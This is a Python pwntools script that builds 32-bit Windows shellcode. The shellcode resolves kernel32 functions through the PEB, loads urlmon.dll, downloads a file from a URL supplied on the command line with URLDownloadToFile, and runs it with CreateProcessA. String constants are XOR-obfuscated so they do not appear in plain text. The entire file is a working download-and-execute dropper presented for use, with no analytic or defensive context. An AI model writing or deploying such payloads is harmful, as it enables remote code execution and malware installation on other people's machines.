#!/usr/bin/env python3
from pwn import *
import sys, re

def str_to_stack(s):
	res = ''
	s = s.encode()
	s+=b'\x00'*(4 - (len(s)%4))
	sz = 0
	while len(s)>0:
		c = '0x'+xor(s[-4:][::-1], 0xff).hex()
		s = s[:-4]
		res+=f'''
mov eax, {c}
xor eax, 0xffffffff
push eax
'''
		sz+=4
	return res, sz




if __name__ == '__main__':
	url = ''
	filename = 'thing.exe'
	out = ''
	for i in range(len(sys.argv)-1):
		if sys.argv[i] == '-u' or sys.argv[i] == '--url':
			url = sys.argv[i+1]
		elif sys.argv[i] == '-f' or sys.argv[i] == '--filename':
			filename = sys.argv[i+1]
		elif sys.argv[i] == '-o' or sys.argv[i] == '--output':
			out = sys.argv[i+1]
		elif sys.argv[i] == '-h' or sys.argv[i] == '--help':
			printf(f'{sys.argv[0]} -u/--url URL -f/--filename FILENAME -o/--output OUTFILE -h/--help')
			exit()

	if url == '':
		print("Provide url")
		exit()

	url, url_size = str_to_stack(url)
	filename, filename_size = str_to_stack(filename)

	code = f'''
push ebp
mov ebp, esp
sub esp, 0x30

mov eax, [fs:0x30]; PEB addr
mov eax, [eax+0xc]; PEB_LDR_DATA addr
mov eax, [eax+0x14]
mov eax, [eax]
mov eax, [eax]
mov eax, [eax+0x10]; kernel32.dll base addr
mov [ebp-4], eax; var4=kerneldll base addr
mov eax, [eax+0x3c]
add eax, [ebp-4]; new header addr
mov eax, [eax+0x78]
add eax, [ebp-4]; export table addr
mov [ebp-8], eax; var8=export table
mov eax, [eax+0x20]
add eax, [ebp-4]; name pointer table
mov [ebp-12], eax; var12=name table
mov eax, [ebp-8]
mov eax, [eax+0x24]
add eax, [ebp-4]
mov [ebp-16], eax; var16= ordinal table
mov eax, [ebp-8]
mov eax, [eax+0x1c]
add eax, [ebp-4]
mov [ebp-20], eax; var20 = addr table


mov eax, 0xffff8c8c
xor eax, 0xffffffff
push eax
mov eax, 0x9a8d9b9b
xor eax, 0xffffffff
push eax
mov eax, 0xbe9c908d
xor eax, 0xffffffff
push eax
mov eax, 0xaf8b9ab8
xor eax, 0xffffffff
push eax
mov esi, esp; GetProcAddr

xor ecx, ecx
xor eax, eax
xor ebx, ebx
.lp1:
	mov edi, [ebp-12]
	mov edi, [edi+eax*4]
	add edi, [ebp-4]
	xor ecx, ecx
	.lp2:
		mov bl, [esi+ecx]
		mov bh, [edi+ecx]
		test bl, bl
		jz .found
		inc ecx
		cmp bl, bh
		je .lp2
		inc eax
		jmp .lp1

.found:
; eax = index of func
xor ecx, ecx
mov edi, [ebp-16]
mov cx, [edi+2*eax]
mov edi, [ebp-20]
mov eax, [edi+4*ecx]
add eax, [ebp-4]
mov [ebp-8], eax; var8 = GetProcAddr

add esp, 16; were allocated for string

; WUB WUB

mov eax, 0xffffffff
xor eax, 0xffffffff
push eax

mov eax, 0xbe868d9e
xor eax, 0xffffffff
push eax

mov eax, 0x8d9d96b3
xor eax, 0xffffffff
push eax

mov eax, 0x9b9e90b3
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-12], eax; var12=LoadLibrary
add esp, 16

mov eax, 0xffff9393
xor eax, 0xffffffff
push eax

mov eax, 0x9bd19190
xor eax, 0xffffffff
push eax

mov eax, 0x92938d8a
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-12]
call eax
mov [ebp-16], eax; var16 = urlmon.dll

add esp, 12


mov eax, 0xffffbe9a
xor eax, 0xffffffff
push eax

mov eax, 0x9396b990
xor eax, 0xffffffff
push eax

mov eax, 0xab9b9e90
xor eax, 0xffffffff
push eax

mov eax, 0x93918890
xor eax, 0xffffffff
push eax

mov eax, 0xbbb3adaa
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-16]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-20], eax; var20=URLDownloadToFile
add esp, 20

; URL

{url}

mov [ebp-24], esp

; FILENAME

{filename}

mov [ebp-28], esp

xor eax, eax
push eax; callback
push eax; reserved
mov eax, [ebp-28]
push eax; filename
mov eax, [ebp-24]
push eax; url
xor eax, eax
push eax; caller

mov eax, [ebp-20]
call eax


mov eax, 0xffffbe8c
xor eax, 0xffffffff
push eax

mov eax, 0x8c9a9c90
xor eax, 0xffffffff
push eax

mov eax, 0x8daf9a8b
xor eax, 0xffffffff
push eax

mov eax, 0x9e9a8dbc
xor eax, 0xffffffff
push eax

push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax
mov ebx, eax
add esp, 0x10

xor eax, eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax

mov ecx, 0x11
lea eax, [esp+0x10]
mov edi, eax
xor eax, eax
stosd
mov dword ptr [esp+0x10], 0x44
mov ecx, esp
mov eax, ecx
push eax
lea eax, [ecx+0x10]
push eax
xor eax, eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax


mov eax, [ebp-28]
push eax
call ebx

add esp, 0x70
add esp, {url_size+filename_size}; url and filename

add esp, 0x30
pop ebp
ret
'''

	context.update(arch='i686', bits=32)
	code = re.sub(';.*\n', '\n', code)
	sc = asm(code)
	if out == '':
		print(sc)
	else:
		open(out, 'wb').write(sc)
